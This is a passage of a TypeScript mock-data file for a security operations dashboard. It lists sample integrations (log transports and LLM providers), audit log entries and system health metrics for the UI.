    tlsEnabled: true,
    version: 'v2',
  },
  {
    id: 'int-syslog-fwd',
    name: 'Syslog Forwarder',
    category: 'Transport',
    status: 'Connected',
    lastDelivery: '1 sec ago',
    eventsSent: '98.1M msgs',
    description: 'Reliable TCP RFC5424 log forwarder to central storage tier.',
    endpoint: 'tcp://syslog-gw.internal:514',
    tlsEnabled: false,
    version: '1.0',
  },
  {
    id: 'int-otlp',
    name: 'OpenTelemetry (OTLP)',
    category: 'Transport',
    status: 'Connected',
    lastDelivery: '1 sec ago',
    eventsSent: '12.4M metrics',
    description: 'OTLP gRPC pipeline exporting host telemetry and pipeline queue stats.',
    endpoint: 'grpc://otel-collector.internal:4317',
    tlsEnabled: true,
    version: '0.98.0',
  },
  {
    id: 'int-webhook',
    name: 'Security Webhook / SOAR',
    category: 'Transport',
    status: 'Connected',
    lastDelivery: '4 min ago',
    eventsSent: '1,420 triggers',
    description: 'HMAC signed webhook triggers dispatched to automated playbook runbooks.',
    endpoint: 'https://soar.internal.corp/api/v1/warden-alerts',
    tlsEnabled: true,
    version: '1.0',
  },
  {
    id: 'int-kafka',
    name: 'Apache Kafka Bus',
    category: 'Transport',
    status: 'Not Connected',
    lastDelivery: 'Never',
    eventsSent: '0',
    description: 'Enterprise message queue topic dispatcher (warden-windows-events).',
    endpoint: 'kafka-broker-01.corp:9092',
    tlsEnabled: true,
    version: '3.6.0',
  },
  {
    id: 'int-gemini',
    name: 'Gemini Security Engine',
    category: 'AI',
    status: 'Connected',
    lastDelivery: '4 min ago',
    eventsSent: '48 queries today',
    description: 'Enterprise LLM backend for contextual attack chain synthesis, MITRE correlation, and log parsing.',
    endpoint: 'Backend Proxy Gateway (/api/v1/ai/investigate)',
    tlsEnabled: true,
    version: 'Gemini 2.5 Flash / Pro',
  },
  {
    id: 'int-openai',
    name: 'OpenAI Enterprise Gateway',
    category: 'AI',
    status: 'Not Connected',
    lastDelivery: 'Never',
    eventsSent: '0',
    description: 'Secondary LLM provider abstraction endpoint.',
    endpoint: 'https://api.openai.com/v1',
    tlsEnabled: true,
    version: 'GPT-4o',
  },
  {
    id: 'int-local-model',
    name: 'Air-Gapped Local Model (Ollama / vLLM)',
    category: 'AI',
    status: 'Connected',
    lastDelivery: '12 min ago',
    eventsSent: '14 queries today',
    description: 'On-premise zero-egress LLM for restricted and classified industrial SCADA enclaves.',
    endpoint: 'http://ai-worker-isolated.local:11434',
    tlsEnabled: false,
    version: 'Llama-3.3-70B-Instruct-Q4',
  },
];

// Audit Log Records
export const MOCK_AUDIT_LOGS: AuditRecord[] = [
  {
    id: 'audit-001',
    timestamp: '2026-09-02 13:42:10 UTC',
    user: 'admin',
    action: 'Changed collection profile',
    object: 'SERVER-42 (Profile: Incident Response / Investigation)',
    result: 'Success',
    sourceIp: '10.20.0.5',
    details: 'Collection mode elevated from Baseline to Investigation Mode by Analyst Alex Vance',
  },
  {
    id: 'audit-002',
    timestamp: '2026-09-02 13:37:45 UTC',
    user: 'analyst',
    action: 'Created investigation',
    object: 'INV-000142 (Suspicious Service Installation)',
    result: 'Success',
    sourceIp: '10.20.0.8',
    details: 'Investigation workspace initialized with 5 evidence items',
  },
  {
    id: 'audit-003',
    timestamp: '2026-09-02 13:31:02 UTC',
    user: 'admin',
    action: 'Enrolled agent',
    object: 'SERVER-55 (Hostname: NODE-055)',
    result: 'Success',
    sourceIp: '10.20.0.5',
    details: 'Agent token generated and registered with SHA-256 certificate handshake',
  },
  {
    id: 'audit-004',
    timestamp: '2026-09-02 12:15:30 UTC',
    user: 'system',
    action: 'Automated Rule Deployment',
    object: 'Detection Rule det-005 (Defender Tampering)',
    result: 'Success',
    sourceIp: '127.0.0.1',
    details: 'Scheduled rule synchronization completed',
  },
  {
    id: 'audit-005',
    timestamp: '2026-09-02 11:40:19 UTC',
    user: 'analyst',
    action: 'Exported Telemetry Data',
    object: 'Event Explorer Query (host:SERVER-42, last 24h)',
    result: 'Success',
    sourceIp: '10.20.0.8',
    details: '17,421 events exported to secure signed ZIP archive',
  },
  {
    id: 'audit-006',
    timestamp: '2026-09-02 10:50:00 UTC',
    user: 'admin',
    action: 'Modified Syslog Listener',
    object: 'Listener UDP 514',
    result: 'Success',
    sourceIp: '10.20.0.5',
    details: 'Buffer size expanded to 512 MB',
  },
  {
    id: 'audit-007',
    timestamp: '2026-09-02 09:12:44 UTC',
    user: 'guest_test',
    action: 'Failed Console Authentication',
    object: 'Console Session',
    result: 'Failure',
    sourceIp: '198.51.100.42',
    details: 'Invalid MFA token submission',
  },
];

// System Health Overview
export const MOCK_SYSTEM_HEALTH: SystemHealthComponent[] = [
  {
    name: 'Platform Core',
    status: 'Operational',
    metrics: {
      throughput: '12,481 ev/min',
      latency: '14ms',
      errors: '0.00%',
    },
    description: 'Central event streaming bus, dispatch router, and state engine.',
  },
  {
    name: 'Ingestion Gateway',
    status: 'Operational',
    metrics: {
      throughput: '18,200 msg/sec',
      latency: '8ms',
      queueDepth: '3.2 GB (Normal)',
    },
    description: 'High-speed binary and TLS framing ingestion pipeline.',
  },
  {
    name: 'OpenSearch Hot Tier',
    status: 'Operational',
    metrics: {
      throughput: '3.4 GB/hr',
      latency: '24ms query',
      errors: '0.00%',
    },
    description: '6-node primary distributed search cluster and shard routing.',
  },
  {
    name: 'PostgreSQL Metadata & State',
    status: 'Operational',
    metrics: {
      latency: '3ms query',
      errors: '0.00%',
    },
    description: 'ACID relational store for agents, profiles, investigations, and audit history.',
  },
  {
    name: 'AI Gateway Proxy',
    status: 'Operational',
    metrics: {
      latency: '480ms p95',
      errors: '0.00%',
    },
    description: 'Secure tokenized backend proxy for LLM inference and parser assistance.',
  },
  {
    name: 'Agent Fleet Connectivity',
    status: 'Warning',
    metrics: {
      connectedCount: '179 of 184 Healthy',
      errors: '2 Offline, 3 Warning',
      queueDepth: '1.2 GB backpressure on DC-01',
    },
    description: '184 enrolled Windows endpoints and industrial OT collectors.',
  },
];
